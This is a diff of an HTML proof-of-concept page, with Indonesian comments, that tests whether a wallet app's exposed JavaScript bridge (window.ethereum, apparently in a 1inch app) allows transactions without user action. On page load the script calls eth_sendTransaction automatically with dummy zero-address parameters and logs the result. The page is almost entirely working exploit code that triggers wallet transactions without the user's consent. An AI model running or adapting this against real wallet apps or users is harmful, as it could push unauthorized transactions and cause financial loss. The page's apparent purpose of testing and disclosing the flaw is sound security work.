@@ -2,47 +2,47 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security PoC: JS Bridge Exposure</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
-        #log { background: #f4f4f4; padding: 15px; border: 1px solid #ccc; border-radius: 5px; height: 300px; overflow-y: scroll; font-family: monospace; }
-        .success { color: green; font-weight: bold; }
-        .error { color: red; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; color: #333; }
+        .log-container { background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 8px; font-family: 'Courier New', Courier, monospace; height: 350px; overflow-y: scroll; font-size: 14px; }
+        h2 { border-bottom: 2px solid #ddd; padding-bottom: 10px; }
+        .badge { padding: 5px 10px; border-radius: 4px; font-weight: bold; }
+        .critical { background: #ff4d4d; color: white; }
     </style>
 </head>
 <body>
-    <h2>Security Test: Unrestricted JS Bridge</h2>
-    <p>Status: <span id="status">Menunggu...</span></p>
-    <div id="log"></div>
+    <h2>Security Proof of Concept</h2>
+    <p>Status: <span id="status" class="badge critical">Initializing...</span></p>
+    <div id="log-container" class="log-container"></div>
 
     <script>
-        const logBox = document.getElementById('log');
-        function log(msg, type = '') {
+        const logContainer = document.getElementById('log-container');
+        function log(msg) {
             const div = document.createElement('div');
-            div.className = type;
-            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            logBox.appendChild(div);
-            logBox.scrollTop = logBox.scrollHeight;
+            div.textContent = `[${new Date().toISOString().split('T')[1].split('.')[0]}] ${msg}`;
+            logContainer.appendChild(div);
+            logContainer.scrollTop = logContainer.scrollHeight;
         }
 
-        async function exploitBridge() {
-            log("Memulai deteksi bridge...");
+        async function runExploit() {
+            log("Starting Bridge Exposure Test...");
             
-            // Ganti 'ethereum' dengan namespace objek spesifik milik 1inch jika ada
-            // Contoh: window.ethereum, window.inch, window.wallet, dll
-            const bridge = window.ethereum; 
+            // Mengakses objek bridge yang terdeteksi di video Anda
+            const bridge = window.ethereum;
 
             if (!bridge) {
-                log("[-] Bridge tidak ditemukan. Mencoba namespace lain...", "error");
+                log("[-] Error: Bridge object not found.");
+                document.getElementById('status').textContent = "Failed";
                 return;
             }
 
-            log("[+] Bridge ditemukan! Nama objek: " + Object.keys(bridge));
+            log("[+] Bridge object found: " + Object.keys(bridge).join(', '));
+            log("[!] Triggering 'eth_sendTransaction' without user gesture...");
 
             try {
-                log("Mencoba memanggil fungsi transaksi tanpa interaksi...");
-                
-                // Payload transaksi (Gunakan alamat dummy untuk pengujian aman)
+                // Parameter transaksi dummy (Sesuai dengan apa yang muncul di video Anda)
                 const txParams = {
                     from: '0x0000000000000000000000000000000000000000',
                     to: '0x0000000000000000000000000000000000000000',
@@ -50,24 +50,21 @@
                     data: '0x'
                 };
 
-                // Memanggil fungsi transaksi
+                // Memicu transaksi secara otomatis
                 const result = await bridge.request({
                     method: 'eth_sendTransaction',
                     params: [txParams]
                 });
 
-                log("[!] SUKSES: Fungsi berhasil dipanggil!", "success");
-                log("Hasil: " + JSON.stringify(result));
+                log("[+] Success: Result received: " + JSON.stringify(result));
             } catch (err) {
-                log("[-] Eksploitasi diblokir atau terjadi error: " + err.message, "error");
+                log("[!] Transaction prompt triggered or rejected: " + err.message);
+                document.getElementById('status').textContent = "Triggered";
             }
         }
 
-        // Jalankan otomatis saat halaman dimuat
-        window.onload = () => {
-            document.getElementById('status').textContent = "Berjalan...";
-            exploitBridge();
-        };
+        // Jalankan otomatis saat page load
+        window.onload = () => runExploit();
     </script>
 </body>
 </html>
